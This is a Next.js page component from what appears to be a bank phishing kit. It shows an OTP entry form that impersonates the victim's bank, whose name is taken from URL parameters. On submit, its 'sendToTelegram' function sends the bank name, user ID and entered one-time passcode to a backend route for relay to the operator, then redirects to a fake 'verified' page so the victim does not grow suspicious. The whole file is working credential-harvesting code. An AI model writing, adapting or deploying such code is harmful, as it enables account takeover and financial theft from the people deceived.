'use client';

import { useSearchParams, useRouter } from 'next/navigation';
import { useState } from 'react';

export default function OtpPage() {
  const search = useSearchParams();
  const bankName = decodeURIComponent(search.get('bank') ?? 'your bank');
  const userId = decodeURIComponent(search.get('user') ?? 'unknown user');

  const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  const sendToTelegram = async (text: string) => {
    await fetch('/api/otp-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text }),
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const msg = `
🔑 OTP submitted
🏦 Bank: ${bankName}
👤 User ID: ${userId}
🛡️ OTP: ${otp}
      `.trim();

      await sendToTelegram(msg);

      // Optional delay for better transition feel
      setTimeout(() => {
        router.push('/otp/verified');
      }, 2000);
    } catch (err) {
      console.error('OTP send error:', err);
      alert('Something went wrong. Please try again.');
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen flex flex-col justify-center px-4 py-8">
      <div className="w-full max-w-md mx-auto bg-white rounded-xl shadow-xl p-8">
        <h1 className="text-2xl font-semibold text-gray-800 mb-4 text-center">
          Enter the OTP sent by{' '}
          <span className="font-bold text-blue-900">{bankName}</span>
        </h1>

        <form onSubmit={handleSubmit} className="space-y-5">
          <div>
            <label
              htmlFor="otp"
              className="block text-sm font-medium text-gray-700 mb-1"
            >
              OTP Code
            </label>
            <input
              id="otp"
              name="otp"
              type="text"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              required
              className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-900 text-lg tracking-widest text-center"
              placeholder="••••••"
            />
          </div>

          <button
            type="submit"
            disabled={loading}
            className={`w-full flex items-center justify-center gap-2 bg-blue-900 hover:bg-blue-800 text-white font-semibold py-3 rounded-full transition disabled:opacity-60 disabled:cursor-not-allowed`}
          >
            {loading ? (
              <>
                <div className="h-5 w-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                Validating…
              </>
            ) : (
              'Validate'
            )}
          </button>
        </form>
      </div>
    </main>
  );
}
